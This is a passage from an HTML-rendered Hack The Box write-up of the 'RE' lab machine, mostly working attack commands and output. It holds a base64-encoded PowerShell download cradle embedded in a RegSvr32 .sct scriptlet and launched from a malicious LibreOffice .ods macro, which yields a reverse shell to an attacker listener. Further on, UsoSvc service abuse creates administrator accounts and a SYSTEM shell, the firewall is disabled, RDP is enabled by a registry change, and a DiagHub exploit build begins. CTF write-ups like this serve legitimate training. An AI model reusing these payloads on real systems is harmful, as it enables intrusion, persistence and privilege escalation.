</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>PS </span>C:\Users&gt; <span style=color:#8be9fd;font-style:italic>cd </span>Administrator
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>PS </span>C:\Users\Administrator&gt; <span style=color:#8be9fd;font-style:italic>cd </span>Desktop
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>PS </span>C:\Users\Administrator\Desktop&gt; <span style=color:#8be9fd;font-style:italic>type </span>root.txt
</span></span></code></pre></div><h1 id=unintended-exploitation-path>Unintended exploitation path</h1><p>There is an unintended exploit that allows to by-pass the yara rules check at the condition that the user belongs to
We google &lsquo;regsvr32 sct file&rsquo; to get the <a href=https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct>RegSvr32.sct</a> payload from atomic-red-team.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>echo</span> IEX<span style=color:#f1fa8c>\(</span>new-object net.webclient<span style=color:#f1fa8c>\)</span>.downloadstring<span style=color:#f1fa8c>\(\&#39;</span>http://10.10.14.73:8080/iis.ps1<span style=color:#f1fa8c>\&#39;\)</span> | iconv -t utf-16le | base64 -w <span style=color:#bd93f9>0</span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADcAMwA6ADgAMAA4ADAALwBpAGkAcwAuAHAAcwAxACcAKQAKAA</span><span style=color:#ff79c6>==</span>
</span></span></code></pre></div><p>we edit the sct file :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>ctf@6274ae97a895:~/htb$ cp RegSvr32.sct evil.sct
</span></span><span style=display:flex><span>ctf@6274ae97a895:~/htb$ vi evil.sct
</span></span><span style=display:flex><span>ctf@6274ae97a895:~/htb$ cat evil.sct
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>..<span style=color:#ff79c6>]</span>
</span></span><span style=display:flex><span>ctf@6274ae97a895:~/htb$ cat ods_regsrv32/Basic/Standard/Module1.xml
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>..<span style=color:#ff79c6>]</span>
</span></span></code></pre></div><p>We modify the payload</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#ff79c6>&lt;?XML version=&#34;1.0&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>&lt;scriptlet&gt;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>&lt;registration</span>
</span></span><span style=display:flex><span>    <span style=color:#50fa7b>progid=</span><span style=color:#f1fa8c>&#34;PoC&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#50fa7b>classid=</span><span style=color:#f1fa8c>&#34;{F0001111-0000-0000-0000-0000FEEDACDC}&#34;</span> <span style=color:#ff79c6>&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#6272a4>&lt;!-- regsvr32 /s /u /i:http://example.com/file.sct scrobj.dll --&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>&lt;script</span> <span style=color:#50fa7b>language=</span><span style=color:#f1fa8c>&#34;JScript&#34;</span><span style=color:#ff79c6>&gt;</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>&lt;![CDATA[
</span></span></span><span style=display:flex><span><span style=color:#ff79c6>                        // What you are hoping to catch is the cmdline, modloads, or network connections, or any variation
</span></span></span><span style=display:flex><span><span style=color:#ff79c6>                        var r = new ActiveXObject(&#34;WScript.Shell&#34;).Run(&#34;powershell -encodedcommand SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADcAMwA6ADgAMAA4ADAALwBpAGkAcwAuAHAAcwAxACcAKQAKAA==&#34;);
</span></span></span><span style=display:flex><span><span style=color:#ff79c6>
</span></span></span><span style=display:flex><span><span style=color:#ff79c6>                ]]&gt;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>&lt;/script&gt;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>&lt;/registration&gt;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>&lt;/scriptlet&gt;</span>
</span></span></code></pre></div><p>We modify the ods file Module and zip it into file regsrv32.ods</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#ff79c6>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>&lt;!DOCTYPE script:module PUBLIC &#34;-//OpenOffice.org//DTD OfficeDocument 1.0//EN&#34; &#34;module.dtd&#34;&gt;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>&lt;script:module</span> <span style=color:#50fa7b>xmlns:script=</span><span style=color:#f1fa8c>&#34;http://openoffice.org/2000/script&#34;</span> <span style=color:#50fa7b>script:name=</span><span style=color:#f1fa8c>&#34;Module1&#34;</span> <span style=color:#50fa7b>script:language=</span><span style=color:#f1fa8c>&#34;StarBasic&#34;</span> <span style=color:#50fa7b>script:moduleType=</span><span style=color:#f1fa8c>&#34;normal&#34;</span><span style=color:#ff79c6>&gt;</span>REM  *****  BASIC  *****
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Sub Main
</span></span><span style=display:flex><span>    a = &amp;quot;regsvr32 /s /u /i:http://10.10.14.73:8080/evil.sct scrobj.dll&amp;quot;
</span></span><span style=display:flex><span>        Shell(a)
</span></span><span style=display:flex><span>End Sub
</span></span><span style=display:flex><span><span style=color:#ff79c6>&lt;/script:module&gt;</span>
</span></span></code></pre></div><p>After uploading the ods file with smbclient, we see evil.sct then iis.ps1 being downloaded by the victim. and a shell is given:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>ctf@6274ae97a895:~/htb$ rlwrap nc -lnvp <span style=color:#bd93f9>8001</span>
</span></span><span style=display:flex><span>listening on <span style=color:#ff79c6>[</span>any<span style=color:#ff79c6>]</span> <span style=color:#bd93f9>8001</span> ...
</span></span><span style=display:flex><span>connect to <span style=color:#ff79c6>[</span>172.17.0.2<span style=color:#ff79c6>]</span> from <span style=color:#ff79c6>(</span>UNKNOWN<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>[</span>192.168.99.1<span style=color:#ff79c6>]</span> <span style=color:#bd93f9>65326</span>
</span></span><span style=display:flex><span>Windows PowerShell running as user luke on RE
</span></span><span style=display:flex><span>Copyright <span style=color:#ff79c6>(</span>C<span style=color:#ff79c6>)</span> <span style=color:#bd93f9>2015</span> Microsoft Corporation. All rights reserved.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\P</span>rogram Files<span style=color:#f1fa8c>\L</span>ibreOffice<span style=color:#f1fa8c>\p</span>rogram&gt;whoami
</span></span><span style=display:flex><span>re<span style=color:#f1fa8c>\l</span>uke
</span></span></code></pre></div><p>We connect <a href=http://re.htb/antak.aspx>http://re.htb/antak.aspx</a> then we execute</p><pre tabindex=0><code>&#34;powershell -encodedcommand SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADcAMwA6ADgAMAA4ADAALwBpAGkAcwAuAHAAcwAxACcAKQAKAA==&#34;
</code></pre><p>to connect a remote TCP Shell on port 8001</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>ctf@6274ae97a895:~/htb$ rlwrap nc -lnvp <span style=color:#bd93f9>8001</span>
</span></span><span style=display:flex><span>listening on <span style=color:#ff79c6>[</span>any<span style=color:#ff79c6>]</span> <span style=color:#bd93f9>8001</span> ...
</span></span><span style=display:flex><span>connect to <span style=color:#ff79c6>[</span>172.17.0.2<span style=color:#ff79c6>]</span> from <span style=color:#ff79c6>(</span>UNKNOWN<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>[</span>192.168.99.1<span style=color:#ff79c6>]</span> <span style=color:#bd93f9>65337</span>
</span></span><span style=display:flex><span>Windows PowerShell running as user RE$ on RE
</span></span><span style=display:flex><span>Copyright <span style=color:#ff79c6>(</span>C<span style=color:#ff79c6>)</span> <span style=color:#bd93f9>2015</span> Microsoft Corporation. All rights reserved.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\w</span>indows<span style=color:#f1fa8c>\s</span>ystem32<span style=color:#f1fa8c>\i</span>netsrv&gt;whoami
</span></span><span style=display:flex><span>iis apppool<span style=color:#f1fa8c>\r</span>e
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\w</span>indows<span style=color:#f1fa8c>\s</span>ystem32<span style=color:#f1fa8c>\i</span>netsrv&gt; whoami /all
</span></span><span style=display:flex><span>Group Name                           Type             SID          <span style=color:#8be9fd;font-style:italic>Attributes</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>====================================</span> <span style=color:#ff79c6>================</span> <span style=color:#ff79c6>============</span> <span style=color:#ff79c6>==================================================</span>
</span></span><span style=display:flex><span>NT AUTHORITY<span style=color:#f1fa8c>\S</span>ERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>..<span style=color:#ff79c6>]</span>
</span></span></code></pre></div><p>For this exploit, it is key that the user belongs to NT AUTHORITY\SERVICE group</p><p>We can compile on a windows box:</p><ul><li><a href=https://github.com/GhostPack/SharpUp>SharpUp</a></li><li><a href=https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS>winPEAS.exe</a></li><li><a href=https://github.com/PowerShellMafia/PowerSploit.git>PowerUp</a></li></ul><p>We will simply use PowerUp:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>ctf@6274ae97a895:/opt$ find . | grep -i Powerup
</span></span><span style=display:flex><span>./PowerSploit/Privesc/PowerUp.ps1
</span></span><span style=display:flex><span>ctf@6274ae97a895:/opt$ cp ./PowerSploit/Privesc/PowerUp.ps1 ~/htb/http/
</span></span></code></pre></div><p>On our powershell, we seek for a writable directory to execute our TCP reverse shell.
It is better to use IEX then wget because it will execute the PowerUp.ps1 script.
Note the PowerUp.ps1 script does not execute anything, it simply load some modules that we have to invoke such as <code>Invoke-AllChecks</code>;</p><p>We have permissions to play with UsoSvc: Service Abuse Overwritting</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\w</span>indows<span style=color:#f1fa8c>\s</span>ystem32<span style=color:#f1fa8c>\i</span>netsrv&gt; <span style=color:#8be9fd;font-style:italic>cd</span> <span style=color:#f1fa8c>\
</span></span></span><span style=display:flex><span><span style=color:#f1fa8c></span>PS C:<span style=color:#f1fa8c>\&gt;</span> <span style=color:#8be9fd;font-style:italic>cd</span> users
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\u</span>sers&gt; <span style=color:#8be9fd;font-style:italic>cd</span> public
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\u</span>sers<span style=color:#f1fa8c>\p</span>ublic&gt; <span style=color:#8be9fd;font-style:italic>cd</span> Documents
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\u</span>sers<span style=color:#f1fa8c>\p</span>ublic<span style=color:#f1fa8c>\D</span>ocuments&gt; <span style=color:#8be9fd;font-style:italic>echo</span> <span style=color:#f1fa8c>&#39;test&#39;</span> &gt; <span style=color:#8be9fd;font-style:italic>test</span>
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\u</span>sers<span style=color:#f1fa8c>\p</span>ublic<span style=color:#f1fa8c>\D</span>ocuments&gt; rm <span style=color:#8be9fd;font-style:italic>test</span>
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\u</span>sers<span style=color:#f1fa8c>\p</span>ublic<span style=color:#f1fa8c>\d</span>ocuments&gt; IEX<span style=color:#ff79c6>(</span>new-object net.webclient<span style=color:#ff79c6>)</span>.downloadstring<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#39;http://10.10.14.73:8080/PowerUp.ps1&#39;</span><span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\u</span>sers<span style=color:#f1fa8c>\p</span>ublic<span style=color:#f1fa8c>\d</span>ocuments&gt; Invoke-AllChecks
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\u</span>sers<span style=color:#f1fa8c>\p</span>ublic<span style=color:#f1fa8c>\D</span>ocuments&gt; wget -o PowerUp.ps1 http://10.10.14.73:8080/PowerUp.ps1
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Checking service permissions...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ServiceName   : UsoSvc
</span></span><span style=display:flex><span>Path          : C:<span style=color:#f1fa8c>\W</span>indows<span style=color:#f1fa8c>\s</span>ystem32<span style=color:#f1fa8c>\s</span>vchost.exe -k netsvcs -p
</span></span><span style=display:flex><span>StartName     : LocalSystem
</span></span><span style=display:flex><span>AbuseFunction : Invoke-ServiceAbuse -Name <span style=color:#f1fa8c>&#39;UsoSvc&#39;</span>
</span></span><span style=display:flex><span>CanRestart    : True
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>..<span style=color:#ff79c6>]</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\u</span>sers<span style=color:#f1fa8c>\p</span>ublic<span style=color:#f1fa8c>\d</span>ocuments&gt; cmd /c <span style=color:#f1fa8c>&#34;sc query UsoSvc&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>SERVICE_NAME: UsoSvc
</span></span><span style=display:flex><span>        TYPE               : <span style=color:#bd93f9>20</span>  WIN32_SHARE_PROCESS
</span></span><span style=display:flex><span>        STATE              : <span style=color:#bd93f9>4</span>  RUNNING
</span></span><span style=display:flex><span>                                <span style=color:#ff79c6>(</span>STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>        WIN32_EXIT_CODE    : <span style=color:#bd93f9>0</span>  <span style=color:#ff79c6>(</span>0x0<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>        SERVICE_EXIT_CODE  : <span style=color:#bd93f9>0</span>  <span style=color:#ff79c6>(</span>0x0<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>        CHECKPOINT         : 0x0
</span></span><span style=display:flex><span>        WAIT_HINT          : 0x0
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\u</span>sers<span style=color:#f1fa8c>\p</span>ublic<span style=color:#f1fa8c>\d</span>ocuments&gt; cmd /c <span style=color:#f1fa8c>&#34;sc qc UsoSvc&#34;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>SC<span style=color:#ff79c6>]</span> QueryServiceConfig SUCCESS
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>SERVICE_NAME: UsoSvc
</span></span><span style=display:flex><span>        TYPE               : <span style=color:#bd93f9>20</span>  WIN32_SHARE_PROCESS
</span></span><span style=display:flex><span>        START_TYPE         : <span style=color:#bd93f9>2</span>   AUTO_START  <span style=color:#ff79c6>(</span>DELAYED<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>        ERROR_CONTROL      : <span style=color:#bd93f9>1</span>   NORMAL
</span></span><span style=display:flex><span>        BINARY_PATH_NAME   : C:<span style=color:#f1fa8c>\W</span>indows<span style=color:#f1fa8c>\s</span>ystem32<span style=color:#f1fa8c>\s</span>vchost.exe -k netsvcs -p
</span></span><span style=display:flex><span>        LOAD_ORDER_GROUP   :
</span></span><span style=display:flex><span>        TAG                : <span style=color:#bd93f9>0</span>
</span></span><span style=display:flex><span>        DISPLAY_NAME       : Update Orchestrator Service
</span></span><span style=display:flex><span>        DEPENDENCIES       : rpcss
</span></span><span style=display:flex><span>        SERVICE_START_NAME : LocalSystem
</span></span></code></pre></div><p>Now, we have the BINARY_PATH_NAME of the service to perform the service abuse overwriting and create the user john</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\u</span>sers<span style=color:#f1fa8c>\p</span>ublic<span style=color:#f1fa8c>\d</span>ocuments&gt; Invoke-ServiceAbuse -ServiceName <span style=color:#f1fa8c>&#39;UsoSvc&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ServiceAbused Command
</span></span><span style=display:flex><span>------------- -------
</span></span><span style=display:flex><span>UsoSvc        net user john Password123! /add <span style=color:#ff79c6>&amp;&amp;</span> net localgroup Administrators john /add
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\u</span>sers<span style=color:#f1fa8c>\p</span>ublic<span style=color:#f1fa8c>\d</span>ocuments&gt; Invoke-ServiceAbuse -ServiceName <span style=color:#f1fa8c>&#39;UsoSvc&#39;</span> -Command <span style=color:#f1fa8c>&#39;net user john2 Password123! /add&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ServiceAbused Command
</span></span><span style=display:flex><span>------------- -------
</span></span><span style=display:flex><span>UsoSvc        net user john2 Password123! /add
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\u</span>sers<span style=color:#f1fa8c>\p</span>ublic<span style=color:#f1fa8c>\d</span>ocuments&gt; net user
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>User accounts <span style=color:#ff79c6>for</span> <span style=color:#f1fa8c>\\</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>-------------------------------------------------------------------------------
</span></span><span style=display:flex><span>Administrator            cam                      coby
</span></span><span style=display:flex><span>DefaultAccount           Guest                    john
</span></span><span style=display:flex><span>john2                    luke                     WDAGUtilityAccount
</span></span><span style=display:flex><span>The <span style=color:#8be9fd;font-style:italic>command</span> completed with one or more errors.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\u</span>sers<span style=color:#f1fa8c>\p</span>ublic<span style=color:#f1fa8c>\d</span>ocuments&gt;
</span></span></code></pre></div><p>We can now change the binpath, but the service will have to be restarted</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\u</span>sers<span style=color:#f1fa8c>\p</span>ublic<span style=color:#f1fa8c>\d</span>ocuments&gt; cmd /c <span style=color:#f1fa8c>&#39;sc config UsoSvc binpath=&#34;net user superuser Password123! /add&#34;&#39;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>SC<span style=color:#ff79c6>]</span> ChangeServiceConfig SUCCESS
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\u</span>sers<span style=color:#f1fa8c>\p</span>ublic<span style=color:#f1fa8c>\d</span>ocuments&gt; Restart-Service UsoSvc
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\u</span>sers<span style=color:#f1fa8c>\p</span>ublic<span style=color:#f1fa8c>\d</span>ocuments&gt; Restart-Service : Service <span style=color:#f1fa8c>&#39;Update Orchestrator Service (UsoSvc)&#39;</span> cannot be started due to the following error: Cannot
</span></span><span style=display:flex><span>start service UsoSvc on computer <span style=color:#f1fa8c>&#39;.&#39;</span>.
</span></span><span style=display:flex><span>At line:1 char:1
</span></span><span style=display:flex><span>+ Restart-Service UsoSvc
</span></span><span style=display:flex><span>+ ~~~~~~~~~~~~~~~~~~~~~~
</span></span><span style=display:flex><span>    + CategoryInfo          : OpenError: <span style=color:#ff79c6>(</span>System.ServiceProcess.ServiceController:ServiceController<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>[</span>Restart-Service<span style=color:#ff79c6>]</span>
</span></span><span style=display:flex><span>   , ServiceCommandException
</span></span><span style=display:flex><span>    + FullyQualifiedErrorId : CouldNotStartService,Microsoft.PowerShell.Commands.RestartServiceCommand
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\u</span>sers<span style=color:#f1fa8c>\p</span>ublic<span style=color:#f1fa8c>\d</span>ocuments&gt; net user
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>User accounts <span style=color:#ff79c6>for</span> <span style=color:#f1fa8c>\\</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>-------------------------------------------------------------------------------
</span></span><span style=display:flex><span>Administrator            cam                      coby
</span></span><span style=display:flex><span>DefaultAccount           Guest                    john
</span></span><span style=display:flex><span>john2                    luke                     superuser
</span></span><span style=display:flex><span>WDAGUtilityAccount
</span></span><span style=display:flex><span>The <span style=color:#8be9fd;font-style:italic>command</span> completed with one or more errors.
</span></span></code></pre></div><p>Let&rsquo;s run winPEAS.ps1 to observe john belongs to Admnistrator Group and observe UsoSvc:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-&gt; <span style=color:#ff79c6>[</span>+<span style=color:#ff79c6>]</span> ADMINISTRATORS GROUPS &lt;_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
</span></span><span style=display:flex><span>Alias name     Administrators
</span></span><span style=display:flex><span>Comment        Administrators have <span style=color:#8be9fd;font-style:italic>complete</span> and unrestricted access to the computer/domain
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Members
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>-------------------------------------------------------------------------------
</span></span><span style=display:flex><span>Administrator
</span></span><span style=display:flex><span>coby
</span></span><span style=display:flex><span>john
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-&gt; <span style=color:#ff79c6>[</span>+<span style=color:#ff79c6>]</span> UNQUOTED SERVICE PATHS &lt;_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
</span></span><span style=display:flex><span>  <span style=color:#ff79c6>[</span>?<span style=color:#ff79c6>]</span> https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
</span></span><span style=display:flex><span>UsoSvc
</span></span><span style=display:flex><span> net user superuser Password123! /add
</span></span></code></pre></div><p>We can therefore abuse the Service to get a privileged shell.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\u</span>sers<span style=color:#f1fa8c>\p</span>ublic<span style=color:#f1fa8c>\d</span>ocuments&gt; cmd /c <span style=color:#f1fa8c>&#39;sc config UsoSvc binpath= &#34;cmd /c powershell -encodedcommand SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADcAMwA6ADgAMAA4ADAALwBpAGkAcwAuAHAAcwAxACcAKQAKAA==&#34; &#39;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>SC<span style=color:#ff79c6>]</span> ChangeServiceConfig SUCCESS
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\u</span>sers<span style=color:#f1fa8c>\p</span>ublic<span style=color:#f1fa8c>\d</span>ocuments&gt; sc.exe stop usosvc
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>SC<span style=color:#ff79c6>]</span> ControlService FAILED 1062:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>The service has not been started.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\u</span>sers<span style=color:#f1fa8c>\p</span>ublic<span style=color:#f1fa8c>\d</span>ocuments&gt; sc.exe start usosvc
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\u</span>sers<span style=color:#f1fa8c>\p</span>ublic<span style=color:#f1fa8c>\d</span>ocuments&gt;
</span></span><span style=display:flex><span>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
</span></span><span style=display:flex><span>ctf@6274ae97a895:/$ rlwrap nc -lnvp <span style=color:#bd93f9>8001</span>
</span></span><span style=display:flex><span>listening on <span style=color:#ff79c6>[</span>any<span style=color:#ff79c6>]</span> <span style=color:#bd93f9>8001</span> ...
</span></span><span style=display:flex><span>connect to <span style=color:#ff79c6>[</span>172.17.0.2<span style=color:#ff79c6>]</span> from <span style=color:#ff79c6>(</span>UNKNOWN<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>[</span>192.168.99.1<span style=color:#ff79c6>]</span> <span style=color:#bd93f9>65528</span>
</span></span><span style=display:flex><span>Windows PowerShell running as user RE$ on RE
</span></span><span style=display:flex><span>Copyright <span style=color:#ff79c6>(</span>C<span style=color:#ff79c6>)</span> <span style=color:#bd93f9>2015</span> Microsoft Corporation. All rights reserved.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\W</span>indows<span style=color:#f1fa8c>\s</span>ystem32&gt;whoami
</span></span><span style=display:flex><span>nt authority<span style=color:#f1fa8c>\s</span>ystem
</span></span></code></pre></div><p>We observe the firewall is blocking remote desktop connection as port 3389 is filtered <code>nmap -p3389 10.10.10.144</code></p><p>Now Let&rsquo;s disable the firewall and enable Remote Desktop</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\U</span>sers<span style=color:#f1fa8c>\A</span>dministrator<span style=color:#f1fa8c>\D</span>esktop&gt; netsh advfirewall <span style=color:#8be9fd;font-style:italic>set</span> allprofiles state off
</span></span><span style=display:flex><span>Ok.
</span></span></code></pre></div><p>Now port 3389 is closed, which is a good indicator the firewall is off.</p><p>We enable rdp by setting a registry key:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>PS C:<span style=color:#f1fa8c>\U</span>sers<span style=color:#f1fa8c>\A</span>dministrator<span style=color:#f1fa8c>\D</span>esktop&gt; reg add <span style=color:#f1fa8c>&#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&#34;</span> /v fDenyTSConnections /t REG_DWORD /d <span style=color:#bd93f9>0</span> /f
</span></span><span style=display:flex><span>The operation completed successfully.
</span></span></code></pre></div><p>The port is now open</p><h2 id=diaghub-exploit-attempt-to-elevate-privileges-from-iis-to-admin>DiagHub exploit: Attempt to elevate privileges from iis to admin</h2><h3 id=attack-description>Attack description</h3><p>We will use the <a href=https://github.com/decoder-it/diaghub_exploit>Diaghub</a> technique to get a Shell.</p><p>A pre-requisite is to find a location where we are authorized to copy our exploit: We found C:\ProgramData is a good place</p><ol><li>First we download the git project on CommandoVM, then open the solution in Visual Studio.</li><li>We edit FakeDll.cpp with a writeable path <code>C:\\ProgramData\\r.bat</code></li><li>We do the same in diaghub_exploit.cpp on top of LoadDll function</li><li>Change to Release</li><li>Build Solution</li><li><a href=https://stackoverflow.com/questions/42258311/cannot-open-include-file-ctype-h-no-such-file-or-directory>Troubleshoot</a><ol><li>Tools > Tools and Features</li><li>Check &lsquo;Universal Windows Platform Development Tools&rsquo;</li><li>update the project properties for both FakeDll.cpp and diaghub_exploit.cpp<ol><li>Windows SDK version = 10.0.18362.0</li><li>Platform Toolset = Visual Studio 2019 